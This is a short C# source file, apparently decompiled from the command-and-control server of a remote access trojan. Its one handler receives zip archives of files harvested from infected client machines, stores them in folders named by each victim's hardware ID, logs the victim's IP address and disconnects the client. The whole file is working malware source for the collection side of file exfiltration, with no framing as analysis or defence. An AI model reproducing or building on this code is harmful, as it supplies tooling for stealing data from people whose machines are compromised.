using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000040 RID: 64
	public class HandleFileSearcher
	{
		// Token: 0x060002D4 RID: 724 RVA: 0x000158B8 File Offset: 0x000158B8
		public async void SaveZipFile(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
				if (!Directory.Exists(fullPath))
				{
					Directory.CreateDirectory(fullPath);
				}
				await Task.Run(delegate()
				{
					byte[] asBytes = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
					File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", asBytes);
				});
				new HandleLogs().Addmsg(string.Concat(new string[]
				{
					"Client ",
					client.Ip,
					" File Search success，file located @ ClientsFolder/",
					unpack_msgpack.ForcePathObject("Hwid").AsString,
					"/FileSearcher"
				}), Color.Purple);
				client.Disconnected();
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("File Search error " + ex.Message, Color.Red);
			}
		}
	}
}
